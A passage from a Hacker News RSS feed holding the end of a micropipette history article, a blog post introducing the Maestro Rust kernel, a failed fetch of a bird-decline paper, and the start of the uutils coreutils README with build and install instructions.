channels.” His multichannel pipette, with tips arranged in a 3 x 3 grid, was <a target="_blank" href="https://worldwide.espacenet.com/patent/search/family/008507213/publication/FI44069B?q=FI44069C">patented in 1969</a>.&nbsp;</p><p>In 1972, another <a target="_blank" href="https://www.gilson.com/pub/media/docs/GuideToPipettingE.pdf">micropipette breakthrough</a> came from <a target="_blank" href="https://www.gilson.com/default/about/our-history.html">Warren E. Gilson</a>, a bald, ruddy-cheeked medical professor in Wisconsin. With help from his son Robert, and several scientists at the University of Wisconsin, Gilson used a screw mechanism to adjust the travel of the piston, thus changing the volume of liquid. A gauge on the pipette’s side displayed the position of the screw. The pipette also had a locking ring on top that could be set to keep volumes from shifting by accident.</p><p>Gilson’s pipette design is still sold by his eponymous company, which is led by a third-generation family member. In 1974, Gilson’s French collaborator, Eric Marteau D'Autry, <a target="_blank" href="https://patents.google.com/patent/US3991617A">changed the finger hook design and added a tip ejection mechanism</a>. The result was the first recognizably modern micropipette — a device made by a French-American duo, based on earlier designs by German and Finnish scientists.</p><p>The D’Autry-Gilson micropipettes were sold across Europe, but rights to the United States market were bought by <a target="_blank" href="https://krfoundation.org/about/what-we-do/">Kenneth Rainin</a>, a young California businessman. Rainin was born in Cleveland, Ohio in 1938, <a target="_blank" href="https://www.sfgate.com/bayarea/article/Kenneth-Rainin-entrepreneur-donor-2597182.php">later joined the Army</a>, and got his start selling science equipment in Boston. At the age of 25, Rainin founded the Rainin Instrument Company, which distributed Gilson’s pipettes and other laboratory supplies.</p><p>Although Rainin became rich selling Gilson’s pipettes, he also went on to build his own pipette empire that he later sold to the Mettler-Toledo corporation, in 2001, for more than <a target="_blank" href="https://www.sec.gov/Archives/edgar/data/1037646/000103764601500013/tpexhibit.txt">$290 million</a> in cash and stock. Rainin ordered a custom-made, 62-meter-long <a target="_blank" href="https://www.feadship.nl/fleet/rasselas1">motor yacht</a> with English country-home decor and mahogany paneling.</p><p>Rainin had skills outside of business, too. He made many improvements to the micropipette, including the addition of an electronic display to make it easier to see the set volumes, and “quick-set” controls so that scientists didn’t need to twist the pipette several times to move from a small volume to a large volume. Rainin also modified the Gilson design so that it fit better in the hand, and reduced the strength required to eject the plastic tips.<sup>6</sup> More comfortable micropipettes were a welcome improvement; a <a target="_blank" href="https://doi.org/10.1016/s0003-6870(97)00002-1">1997 study</a> that surveyed 80 scientists who used a pipette for more than one hour per day found that 90 percent of them reported hand or elbow disorders.</p><p>As evidenced by Rainin’s ergonomic refinements on Gilson’s base design, micropipette companies operated in relative harmony for several decades. But then, an issue with the Rainin-Gilson contract saw the two companies run headlong into an expensive legal battle, and all equanimity was dashed.</p><p>Rainin was Gilson’s exclusive distributor in the United States. Under the terms of their distribution contract, Rainin was supposed to promote Gilson’s products. But after Gilson’s patent for the adjustable pipette expired in 1991, Rainin saw an opportunity to introduce a competing line of pipettes and market them to American scientists.&nbsp;</p><p>In 2004, Gilson <a target="_blank" href="https://casetext.com/case/rainin-instrument-llc-v-gilson-3#:~:text=The%20court%20then%20granted%20Gilson%27s,and%20sell%20Gilson%27s%20Pipetman%20products.">filed a lawsuit</a> against Rainin, accusing Rainin executives of “a campaign to disparage Gilson's Pipetman products and route customers to their own competing product lines.” A Wisconsin court “granted Gilson's motion for judgment as a matter of law and held that Rainin and Mettler-Toledo breached their obligation to use their best efforts to market and sell Gilson's Pipetman products,” according to <a target="_blank" href="https://www.nbcnews.com/id/wbna7956647">reporting</a> in <em>NBC News</em>. <a target="_blank" href="https://madison.com/news/local/gilson-wins-contract-dispute-the-middleton-based-company-won-500-000-following-a-jury-decision/article_1a203d0d-9441-56cf-ab85-08c9b4f22f43.html">A jury awarded Gilson $500,000 in damages</a>, far less than the $8 million Gilson had initially sought. But the jury’s decision wasn’t the only blow dealt to Rainin: The company also lost their exclusive license to sell Gilson pipettes in the United States, which cost Rainin an estimated $19 million in lost revenue.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/659374af6df8ea43c3238c66_pipette_history_inventors%20(1).png" loading="lazy" alt=""></p><figcaption>Micropipette innovators. From top left, moving clockwise: Heinrich Schnitger, Osmo Suovaniemi, Kenneth Rainin and Warren Gilson.</figcaption></figure><p>As Gilson and Rainin competed for large chunks of the micropipette market, other businesses popped up to profit from their disposable tips.</p><p>The first micropipettes used custom-made Teflon tips, which had good chemical resistance and high accuracy, but were too expensive to regularly dispose of. The German company that first licensed Schnitger’s 1957 invention, Eppendorf, also made the first disposable polypropylene tips. Disposable plastic tips helped scientists avoid some cross-contamination but couldn’t always be used in sensitive experiments because liquids produce small amounts of aerosols that get sucked into the pipette body and then seep into subsequent samples. In 1986, Eppendorf scientists <a target="_blank" href="https://patents.google.com/patent/US4999164A">added a filter at the top of each pipette tip</a> to block such aerosols.<sup>7</sup></p><p>Rainin’s company, seeking to boost profits, also launched their own line of narrow-tapered tips that could only be used on Rainin micropipettes. Their logic was akin to those of the <a target="_blank" href="https://en.wikipedia.org/wiki/Razor_and_blades_model">razor blade companies</a>: sell the pipette for a few hundred dollars and tips for $20 per box. Over time, they assumed, the vast majority of profits would come from selling the tips. In the early 2000s, though, a company called USA Scientific found a way to make Rainin-compatible tips without using Rainin’s patents. Rainin <a target="_blank" href="https://casetext.com/case/usa-scientific-llc-v-rainin-instrument">sued them</a>, albeit unsuccessfully, and USA Scientific still sells Rainin-style tips.</p><p>And that’s the making of the modern micropipette. For roughly three decades, the invention was iterated upon and refined by German, Finnish, American, and French inventors. Some of these inventors were driven by profit, and others just didn’t want to aspirate the brains of a rat. Their collective efforts culminated in an indispensable tool for modern biology and medicine.</p><h2><strong>Adaptive Radiation</strong></h2><p>A typical PhD student in the biosciences will use about 200,000 pipette tips over the course of their research.<sup>8</sup> Hospitals and medical labs use even larger quantities of tips for diagnostic tests. This was starkly highlighted in 2020, when demand for COVID testing, coupled with a low supply of polypropylene resin after Texas power outages temporarily closed plastic manufacturing plants, caused the <a target="_blank" href="https://www.statnews.com/2021/04/28/pipette-tips-shortage/">Great Pipette Tip Shortage.</a>&nbsp;</p><p>Pipette tip manufacturers were backordered for months, and sometimes years, as queues for COVID tests, newborn genetic screening, and other diagnostic tests lengthened. A single PCR-based diagnostic test requires about ten pipette tips, and more than a million of these tests were performed every day by October 2020. Scientists bartered with other scientists for tips, tried their luck with sketchy resellers, or gambled with <a target="_blank" href="https://grenovasolutions.com/grenovas-solution-to-covid-19/">washing and reusing tips</a>.</p><p>But as the adage asserts: necessity is the mother of invention. Just as the first microplate, a flat plate with little wells on top to hold liquids, was invented by a Hungarian scientist as a replacement for plastic tubes after an influenza epidemic led to a <a target="_blank" href="https://www.wellplate.com/the-history-of-the-microplate/">manufacturing shortage</a> in Hungary in the early 1950s, the recent pandemic spurred similar innovations in micropipette and tip designs.</p><p>A chemistry lab in Connecticut invented a <a target="_blank" href="https://pubmed.ncbi.nlm.nih.gov/36689276/">COVID-19 diagnostic kit</a> using 3D-printed micropipette tips and a smartphone app. Chemists in Okayama, Japan developed <a target="_blank" href="https://pubmed.ncbi.nlm.nih.gov/37008150/">paper-based analytical devices</a> that don’t have to be loaded with a micropipette at all. Eppendorf launched a line of pipette tips made from <a target="_blank" href="https://www.eppendorf.com/us-en/lab-academy/lab-solutions/eppendorf-consumables-biobased/">biologically-derived propylene gas</a>, ostensibly to help <a target="_blank" href="https://news-archive.exeter.ac.uk/featurednews/title_488903_en.html">curb plastic waste</a>. While the supply chain corrected itself, ultimately relieving the pipette tip shortage, times of need or specialization are often moments where innovation is especially active.</p><p>The basic micropipette design used in laboratories today has remained largely the same since the mid-1970s, when D’Autry and Gilson made their adjustable version. But innovations have continued to the present. In 2018, a bioengineering team in Chicago <a target="_blank" href="https://www.mdpi.com/2072-666X/9/4/191">open-sourced blueprints</a> for a 3D-printed, adjustable micropipette. A <a target="_blank" href="https://doi.org/10.1039/c8lc00505b">highly precise micropipette</a> that dispenses tiny volumes as small as 0.1 microliter, with a variation of just 0.6 percent, was developed the same year. And in 2014, a Japanese team invented a micropipette that can pick up <a target="_blank" href="https://ieeexplore.ieee.org/document/7006139">individual cells</a> through a thin, glass tube.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/659374f237f40ba11ac2035e_pipette_history_3D_printed%20(1).png" loading="lazy" alt=""></p><figcaption>Adjustable, accurate micropipettes can now be made at home, with little more than medical syringes and 3D-printed plastic parts. Credit: <a target="_blank" href="https://www.mdpi.com/2072-666X/9/4/191">Brennan M.D. <em>et al.</em></a> “Open Design 3D-Printable Adjustable Micropipette that Meets the ISO Standard for Accuracy,” <em>Micromachines </em>(2018).</figcaption></figure><p>Technological progress often proceeds as a linear series of advances: the vacuum tube, then the transistor, then the microchip. But the history of pipettes reveals a subtler story.</p><p>Even before Schnitger made the piston-driven micropipette in 1957, other inventors had proposed unique ways to measure, or move, small volumes of liquid. Some of these ideas worked, but did not catch on. For example, in 1953, two American inventors, James W. Brown and Robert L. Weintraub, <a target="_blank" href="https://image-ppubs.uspto.gov/dirsearch-public/print/downloadPdf/2771217">filed a patent</a> for an adjustable pipette with a removable tip. The device dispensed tiny drops of liquid via the spinning of a wheel on one end, and it could be used with one hand. But Schnitger’s plunger mechanism ultimately won out.</p><p>Path dependencies also shaped the development of the modern micropipette; one refinement often set the course for subsequent ones. Multichannel pipettes today are designed around the 96-well plate, for example, which was itself copied from the Hungarian 72-well format. If scientists had adopted the 72-well format, multichannel pipettes today might look very different.<sup>9</sup></p><p>Nearly all biological research requires the ability to transfer precise volumes of liquids, which makes it interesting to speculate about what might have happened if the micropipette was invented a few years earlier or later.<sup>10</sup> The scientists who <a target="_blank" href="https://en.wikipedia.org/wiki/Crick,_Brenner_et_al._experiment">deciphered the genetic code</a> and <a target="_blank" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3104267/">discovered the principles of gene expression</a> in the late 1950s and early 1960s performed their experiments mostly with mouth pipettes. This makes their feats more impressive, but adjustable micropipettes would have greatly accelerated their work. Likewise, the <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC392330/" target="_blank">groundbreaking</a> <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC431765/" target="_blank">experiments</a> on DNA sequencing in the mid-1970s, which kickstarted the field of genomics, would have been difficult to achieve without micropipettes.</p><p>The micropipette’s history is a reminder that simple tools can have a large impact. Even a task as straightforward as transferring liquid from one tube to another can be accomplished by many different mechanisms, some of which are vastly superior to others. And so it’s worth considering: What is something you do, day after day, that is arduous or bothersome? Do you have a subtle itch or a pressing need to make it easier?</p><p>If the answer is yes, consider spending a couple of days making improvements to the process, as a frustrated Schnitger did in 1957. Simple solutions to widespread problems can alter the course of scientific history.</p><h6>Footnotes</h6><ol start="1" role="list"><li>Today, researchers have mostly heeded this advice, and only use mouth pipettes in niche cases where they need both hands free.</li><li>Eppendorf, a German medical supply company, purchased an exclusive license. The company made at least two models by 1961; one to pipette 1 microliter volumes (smaller than a grain of salt) and another for 25 microliter volumes.</li><li>This feature was essential; Schnitger’s first micropipette was used to transfer formic acid, a chemical that reacts with metal to form hydrogen gas.</li><li>Suovaniemi is 80 years old and remains <a target="_blank" href="https://www.bloomberg.com/profile/person/2502477">chairman of the board</a> of his company, <a target="_blank" href="https://www.biohithealthcare.com/fi/etusivu/">Biohit OYJ</a>.</li><li>The <a target="_blank" href="https://www.thermofisher.com/us/en/home/life-science/lab-plasticware-supplies/pipettes-pipette-tips/finnpipette-systems.html">Finnpipette brand</a>, sold by Thermo Fisher, derives from Suovaniemi’s design. But I’ve never seen one of these pipettes in person, and their market share (at least in America) is a small fraction of other manufacturers.</li><li>Rainin pipettes received the highest overall score in a <a target="_blank" href="https://pubmed.ncbi.nlm.nih.gov/21673445/">2010 study</a> that asked twenty-one scientists to rate the comfort and usability of ten different micropipettes. Scientists collectively rated Rainin pipettes highest for “hand and arm comfort,” as well as its “lower tip ejection force, lower blowout force, and pipette balance in the hand.”</li><li>Eppendorf scientists were inspired by filters designed to <a target="_blank" href="https://patents.google.com/patent/FR2380059A1/en">protect scientists who used mouth pipettes to transfer infectious materials</a>.</li><li>An estimated ten boxes of 96 tips per week, with 50 working weeks per year over a 5-year period, comes out to 240,000 tips. And five years is a generous estimate for completion of a PhD in the biosciences.</li><li>The number 96 has several advantages, including the fact that it has many integer factors, which makes it simple to evenly divide the plate for experiments.</li><li>Polypropylene was not <a target="_blank" href="https://books.google.com/books?id=GjtJfmxvSWgC&amp;pg=PA76#v=onepage">produced at a large scale</a> until the mid-1950s, and so a different (and likely inferior) material would have been required to make the plastic tips.</li></ol><p><em>Metacelsus is a PhD student who researches synthetic biology, stem cells, and reproductive development. He also writes the blog </em><a href="https://denovo.substack.com/" target="_blank"><em>De Novo</em></a><em>.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Maestro: A Linux-compatible kernel in Rust (552 pts)]]></title>
            <link>https://blog.lenot.re/a/introduction</link>
            <guid>38852360</guid>
            <pubDate>Wed, 03 Jan 2024 09:59:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.lenot.re/a/introduction">https://blog.lenot.re/a/introduction</a>, See on <a href="https://news.ycombinator.com/item?id=38852360">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					
					<h6><span id="date-long">2024-01-02T15:00:00+00:00</span></h6>
					<p>
						Maestro is a Unix-like kernel and operating system written from scratch in Rust
					</p>
					<p><img src="https://blog.lenot.re/assets/article/neofetch.png">
				</p></div><div>
					<p>Thanks to the internet, I can learn how most things I am interested in work. However, something stayed a mystery to me for a long time: computers.</p>
<p>Computers are amongst the most complex tools that humanity has ever built. They are a marvel of engineering that we take for granted because we use them in our everyday lives.</p>
<p>I like to dig into complexity, and I like to learn by doing.
On top of that, I spend a lot of time on the computer. Wouldn’t it be cool if I had a system that I would know from A to Z and that I could customise as much as I wanted to fit my expectations?</p>
<p>This is why I decided to build <a href="https://github.com/llenotre/maestro" target="_blank">Maestro</a>. A Unix-like operating system that is meant to be lightweight and compatible-enough with Linux to be usable in everyday life.</p>
<h2>A bit of history</h2>
<p>The first commit of the kernel dates back to December 22nd, 2018, at 3:18 in the morning (the best time to write code, of course). It started as a school project.</p>
<p>It was originally implemented using the <strong>C language</strong> and continued to be for roughly a year and a half, until the codebase became too hard to keep clean.</p>
<p>At that moment, I decided to switch to <strong>Rust</strong> (my first project in this language), which represented several advantages:</p>
<ul>
<li>Restart the project from the beginning, using lessons learned from previous mistakes</li>
<li>Be a bit more innovative than just writing a Linux-like kernel in C. After all, just use Linux at that point</li>
<li>Use the safety of the Rust language to leverage some difficulty of kernel programming. Using Rust’s typing system allows to shift some responsibility over memory safety from the programmer to the compiler</li>
</ul>
<p>In kernel development, debugging is very hard for several reasons:</p>
<ul>
<li>Documentation is often hard to find, and BIOS implementations may be flawed (more often than you would think)</li>
<li>On boot, the kernel has full access to the memory and is allowed to write where it should not (its own code, for example)</li>
<li>Troubleshooting memory leaks is not easy. Tools such as <em>valgrind</em> cannot be used</li>
<li><em>gdb</em> can be used with <em>QEMU</em> and <em>VMWare</em>, but the kernel may have a different behaviour when running on a different emulator or virtual machine. Also, those emulators may not support gdb (example <em>VirtualBox</em>)</li>
<li>Some features in the support for gdb in QEMU or VMWare are missing (such as <em>Record and Replay</em>) and gdb might even crash sometimes</li>
</ul>
<p>All those issues are reasons for using a memory-safe language, to avoid them as much as possible.</p>
<p>Overall, the use of Rust in the kernel allowed for the implementation of a lot of safeguards. And I believe that it is, to this day, the best decision I have made for this project.</p>
<h3>Timelapse</h3>
<video controls="" width="100%" loading="lazy">
  <source src="https://blog.lenot.re/assets/article/gource.mp4" type="video/mp4">
</video>
<p>Created using <a href="https://gource.io/" target="_blank">Gource</a>. Music: <em>Many Moons of Saturn, Mike Cole</em></p>
<h2>The current state of the project</h2>
<p>Maestro is a monolithic kernel, supporting only the x86 (in 32 bits) architecture for now.</p>
<p>At the time of writing, <strong>135</strong> out of <strong>437</strong> Linux system calls (roughly 31%) are more or less implemented.
The project has <strong>48 800</strong> lines of code across <strong>615</strong> files (all repositories combined, counted using the <code>cloc</code> command).</p>
<p>The OS currently has the following components, aside from the kernel:</p>
<ul>
<li><a href="https://github.com/llenotre/solfege" target="_blank">Solfège</a>: a boot system and daemon manager (kind of similar to systemd, but lighter)</li>
<li><a href="https://github.com/llenotre/maestro-utils" target="_blank">maestro-utils</a>: system utility commands</li>
<li><a href="https://github.com/llenotre/blimp" target="_blank">blimp</a>: a package manager</li>
<li>And more components that are available on <a href="https://github.com/llenotre" target="_blank">my github</a></li>
</ul>
<p>So far, the following third-party software has been tested and is working on the OS:</p>
<ul>
<li>musl (C standard library)</li>
<li>bash</li>
<li>Some GNU coreutils commands such as <code>ls</code>, <code>cat</code>, <code>mkdir</code>, <code>rm</code>, <code>rmdir</code>, <code>uname</code>, <code>whoami</code>, etc…</li>
<li>neofetch (a patched version, since the original neofetch does not know about my OS)</li>
</ul>
<h2>Test it yourself!</h2>
<blockquote>
<p><strong>Disclaimer</strong>: It is important to note that the OS is still in a very early stage of development and is highly unstable. I discourage trying to install it on a machine with important data on it.</p>
<p>So far, it has been tested mostly on QEMU, VMWare and VirtualBox.</p>
</blockquote>
<p>There are two ways you can install the OS:</p>
<ul>
<li>Use a pre-built (compressed) .iso file that you can download <a href="https://blog.lenot.re/assets/article/maestro.iso.gz">here</a></li>
<li><a href="https://github.com/llenotre/maestro-install/" target="_blank">Build the ISO yourself</a></li>
</ul>
<p>The ISO provides an installer for the OS. You can use it on QEMU, VMWare or VirtualBox for example.</p>
<blockquote>
<p>You should run the ISO with sufficient RAM (<strong>1GB</strong> should be more than enough).</p>
<p>Such an amount of memory is required because packages to be installed are stored in RAM (on the initramsfs) instead of the disk. This is currently the best method since the OS is <em>not yet</em> able to read on a USB stick or CD-ROM by itself, so it relies on the bootloader for this.</p>
</blockquote>
<h2>What this blog is about</h2>
<p>The aim of this blog is <strong>not</strong> to write tutorials about how to create an OS. This is already well covered by other websites/blogs. I recommend in particular:</p>
<ul>
<li><a href="https://wiki.osdev.org/Expanded_Main_Page" target="_blank">osdev.org</a></li>
<li><a href="https://os.phil-opp.com/" target="_blank">Philipp Oppermann’s blog</a></li>
</ul>
<p>The goal is to explore more advanced subjects (since most people/blogs tend to stop at the basics), to push the subjects as far as I am able to, to write articles about problems I encounter and how I solve them, to discover how computers work underneath, but also operating systems, the internet, and much more… Plenty of things to talk about!</p>
<h2>What’s coming next?</h2>
<p>Cleaning of the codebase and performance optimisations are in order. Since the OS started as a school project, I had to cut corners in order to finish it on time. But now is the time to pay back the technical debt I accumulated.</p>
<p>Some memory leaks are also lying around and have to be fixed. Performance optimisations will probably be a subject for blog articles.</p>
<p>The next leap forward will be to have the package manager fully working on the OS. To do so, some features are required:</p>
<ul>
<li>Network support, which is currently under development. And will probably be the subject of numerous articles</li>
<li>Shared library support. This currently does not work because it requires mapping files directly into memory, which is not currently supported by the implementation of the <code>mmap</code> system call on the kernel</li>
</ul>
<p>After that, I will be able to install (without pain) and test programmes such as compilers (gcc/g++, clang, rustc), make, Git, Vim, etc… And then develop the kernel while using it!</p>
<p>The development of the kernel largely follows a simple procedure:</p>
<ul>
<li><strong>1</strong>: Run a programme on the kernel and see if it works correctly</li>
<li><strong>2</strong>: If it does not work, then:
<ul>
<li><strong>3</strong>: Run the programme while printing system calls and search for the first system call that is causing troubles (not implemented or buggy)</li>
<li><strong>4</strong>: Implement or fix the system call in question</li>
<li><strong>5</strong>: Go to step 1</li>
</ul>
</li>
<li><strong>6</strong>: Else: Yay!</li>
</ul>
<p>The more programmes running correctly on the kernel, the more stable and complete it becomes!</p>
<h2>How <em>you</em> can help</h2>
<p>You can leave a star ⭐ on the <a href="https://github.com/llenotre/maestro" target="_blank">Github repository of the kernel</a> ❤️</p>
<p>And stay in touch by:</p>
<ul>
<li>Subscribing to the newsletter on the <a href="https://blog.lenot.re/">main page</a></li>
<li>Watching the <a href="https://blog.lenot.re/rss">RSS feed</a></li>
</ul>
<p>Do not hesitate to join Discord! If you have feedback to make, advice to give, or questions to ask, I will be glad to answer!</p>

				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Farmland practices are driving bird population decline across Europe (2023) (128 pts)]]></title>
            <link>https://doi.org/10.1073/pnas.2216573120</link>
            <guid>38852142</guid>
            <pubDate>Wed, 03 Jan 2024 09:17:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://doi.org/10.1073/pnas.2216573120">https://doi.org/10.1073/pnas.2216573120</a>, See on <a href="https://news.ycombinator.com/item?id=38852142">Hacker News</a></p>
Couldn't get https://doi.org/10.1073/pnas.2216573120: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Cross-platform Rust rewrite of the GNU coreutils (277 pts)]]></title>
            <link>https://github.com/uutils/coreutils</link>
            <guid>38851740</guid>
            <pubDate>Wed, 03 Jan 2024 07:56:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/uutils/coreutils">https://github.com/uutils/coreutils</a>, See on <a href="https://news.ycombinator.com/item?id=38851740">Hacker News</a></p>
<div id="readability-page-1" class="page"><p dir="auto">uutils coreutils is a cross-platform reimplementation of the GNU coreutils in
<a href="http://www.rust-lang.org/" rel="nofollow">Rust</a>. While all programs have been implemented, some
options might be missing or different behavior might be experienced.</p><p dir="auto">uutils aims to be a drop-in replacement for the GNU utils. Differences with GNU
are treated as bugs.</p><p dir="auto">uutils aims to work on as many platforms as possible, to be able to use the same
utils on Linux, Mac, Windows and other platforms. This ensures, for example,
that scripts can be easily transferred between platforms.</p><div dir="auto">
<h2 tabindex="-1" dir="auto">Documentation</h2>
<p dir="auto">uutils has both user and developer documentation available:</p>
<ul dir="auto">
<li><a href="https://uutils.github.io/coreutils/book/" rel="nofollow">User Manual</a></li>
<li><a href="https://uutils.github.io/dev/coreutils/" rel="nofollow">Developer Documentation</a> (currently offline, you can use docs.rs in the meantime)</li>
</ul>
<p dir="auto">Both can also be generated locally, the instructions for that can be found in
the <a href="https://github.com/uutils/uutils.github.io">coreutils docs</a> repository.</p>

<h2 tabindex="-1" dir="auto">Requirements</h2>
<ul dir="auto">
<li>Rust (<code>cargo</code>, <code>rustc</code>)</li>
<li>GNU Make (optional)</li>
</ul>
<h3 tabindex="-1" dir="auto">Rust Version</h3>
<p dir="auto">uutils follows Rust's release channels and is tested against stable, beta and
nightly. The current Minimum Supported Rust Version (MSRV) is <code>1.70.0</code>.</p>
<h2 tabindex="-1" dir="auto">Building</h2>
<p dir="auto">There are currently two methods to build the uutils binaries: either Cargo or
GNU Make.</p>
<blockquote>
<p dir="auto">Building the full package, including all documentation, requires both Cargo
and Gnu Make on a Unix platform.</p>
</blockquote>
<p dir="auto">For either method, we first need to fetch the repository:</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/uutils/coreutils
cd coreutils"><pre>git clone https://github.com/uutils/coreutils
<span>cd</span> coreutils</pre></div>
<h3 tabindex="-1" dir="auto">Cargo</h3>
<p dir="auto">Building uutils using Cargo is easy because the process is the same as for every
other Rust program:</p>

<p dir="auto">This command builds the most portable common core set of uutils into a multicall
(BusyBox-type) binary, named 'coreutils', on most Rust-supported platforms.</p>
<p dir="auto">Additional platform-specific uutils are often available. Building these expanded
sets of uutils for a platform (on that platform) is as simple as specifying it
as a feature:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo build --release --features macos
# or ...
cargo build --release --features windows
# or ...
cargo build --release --features unix"><pre>cargo build --release --features macos
<span><span>#</span> or ...</span>
cargo build --release --features windows
<span><span>#</span> or ...</span>
cargo build --release --features unix</pre></div>
<p dir="auto">If you don't want to build every utility available on your platform into the
final binary, you can also specify which ones you want to build manually. For
example:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo build --features &quot;base32 cat echo rm&quot; --no-default-features"><pre>cargo build --features <span><span>"</span>base32 cat echo rm<span>"</span></span> --no-default-features</pre></div>
<p dir="auto">If you don't want to build the multicall binary and would prefer to build the
utilities as individual binaries, that is also possible. Each utility is
contained in its own package within the main repository, named "uu_UTILNAME". To
build individual utilities, use cargo to build just the specific packages (using
the <code>--package</code> [aka <code>-p</code>] option). For example:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo build -p uu_base32 -p uu_cat -p uu_echo -p uu_rm"><pre>cargo build -p uu_base32 -p uu_cat -p uu_echo -p uu_rm</pre></div>
<h3 tabindex="-1" dir="auto">GNU Make</h3>
<p dir="auto">Building using <code>make</code> is a simple process as well.</p>
<p dir="auto">To simply build all available utilities:</p>

<p dir="auto">In release mode:</p>

<p dir="auto">To build all but a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make SKIP_UTILS='UTILITY_1 UTILITY_2'"><pre>make SKIP_UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span></pre></div>
<p dir="auto">To build only a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make UTILS='UTILITY_1 UTILITY_2'"><pre>make UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span></pre></div>
<h2 tabindex="-1" dir="auto">Installation</h2>
<h3 tabindex="-1" dir="auto">Install with Cargo</h3>
<p dir="auto">Likewise, installing can simply be done using:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo install --path . --locked"><pre>cargo install --path <span>.</span> --locked</pre></div>
<p dir="auto">This command will install uutils into Cargo's <em>bin</em> folder (<em>e.g.</em>
<code>$HOME/.cargo/bin</code>).</p>
<p dir="auto">This does not install files necessary for shell completion or manpages. For
manpages or shell completion to work, use <code>GNU Make</code> or see
<code>Manually install shell completions</code>/<code>Manually install manpages</code>.</p>
<h3 tabindex="-1" dir="auto">Install with GNU Make</h3>
<p dir="auto">To install all available utilities:</p>

<p dir="auto">To install using <code>sudo</code> switch <code>-E</code> must be used:</p>

<p dir="auto">To install all but a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make SKIP_UTILS='UTILITY_1 UTILITY_2' install"><pre>make SKIP_UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span> install</pre></div>
<p dir="auto">To install only a few of the available utilities:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make UTILS='UTILITY_1 UTILITY_2' install"><pre>make UTILS=<span><span>'</span>UTILITY_1 UTILITY_2<span>'</span></span> install</pre></div>
<p dir="auto">To install every program with a prefix (e.g. uu-echo uu-cat):</p>
<div dir="auto" data-snippet-clipboard-copy-content="make PROG_PREFIX=PREFIX_GOES_HERE install"><pre>make PROG_PREFIX=PREFIX_GOES_HERE install</pre></div>
<p dir="auto">To install the multicall binary:</p>

<p dir="auto">Set install parent directory (default value is /usr/local):</p>
<div dir="auto" data-snippet-clipboard-copy-content="# DESTDIR is also supported
make PREFIX=/my/path install"><pre><span><span>#</span> DESTDIR is also supported</span>
make PREFIX=/my/path install</pre></div>
<p dir="auto">Installing with <code>make</code> installs shell completions for all installed utilities
for <code>bash</code>, <code>fish</code> and <code>zsh</code>. Completions for <code>elvish</code> and <code>powershell</code> can also
be generated; See <code>Manually install shell completions</code>.</p>
<h3 tabindex="-1" dir="auto">Manually install shell completions</h3>
<p dir="auto">The <code>coreutils</code> binary can generate completions for the <code>bash</code>, <code>elvish</code>,
<code>fish</code>, <code>powershell</code> and <code>zsh</code> shells. It prints the result to stdout.</p>
<p dir="auto">The syntax is:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run completion <utility> <shell>"><pre>cargo run completion <span>&lt;</span>utility<span>&gt;</span> <span>&lt;</span>shell<span>&gt;</span></pre></div>
<p dir="auto">So, to install completions for <code>ls</code> on <code>bash</code> to
<code>/usr/local/share/bash-completion/completions/ls</code>, run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run completion ls bash > /usr/local/share/bash-completion/completions/ls"><pre>cargo run completion ls bash <span>&gt;</span> /usr/local/share/bash-completion/completions/ls</pre></div>
<h3 tabindex="-1" dir="auto">Manually install manpages</h3>
<p dir="auto">To generate manpages, the syntax is:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run manpage <utility>"><pre>cargo run manpage <span>&lt;</span>utility<span>&gt;</span></pre></div>
<p dir="auto">So, to install the manpage for <code>ls</code> to <code>/usr/local/share/man/man1/ls.1</code> run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo run manpage ls > /usr/local/share/man/man1/ls.1"><pre>cargo run manpage ls <span>&gt;</span> /usr/local/share/man/man1/ls.1</pre></div>
<h2 tabindex="-1" dir="auto">Un-installation</h2>
<p dir="auto">Un-installation differs depending on how you have installed uutils. If you used
Cargo to install, use Cargo to uninstall. If you used GNU Make to install, use
Make to uninstall.</p>
<h3 tabindex="-1" dir="auto">Uninstall with Cargo</h3>
<p dir="auto">To uninstall uutils:</p>

<h3 tabindex="-1" dir="auto">Uninstall with GNU Make</h3>
<p dir="auto">To uninstall all utilities:</p>

<p dir="auto">To uninstall every program with a set prefix:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make PROG_PREFIX=PREFIX_GOES_HERE uninstall"><pre>make PROG_PREFIX=PREFIX_GOES_HERE uninstall</pre></div>
<p dir="auto">To uninstall the multicall binary:</p>
<div dir="auto" data-snippet-clipboard-copy-content="make MULTICALL=y uninstall"><pre>make MULTICALL=y uninstall</pre></div>
<p dir="auto">To uninstall from a custom parent directory:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# DESTDIR is also supported
make PREFIX=/my/path uninstall"><pre><span><span>#</span> DESTDIR is also supported</span>
make PREFIX=/my/path uninstall</pre></div>

<h2 tabindex="-1" dir="auto">GNU test suite compatibility</h2>
<p dir="auto">Below is the evolution of how many GNU tests uutils passes. A more detailed
breakdown of the GNU test results of the main branch can be found
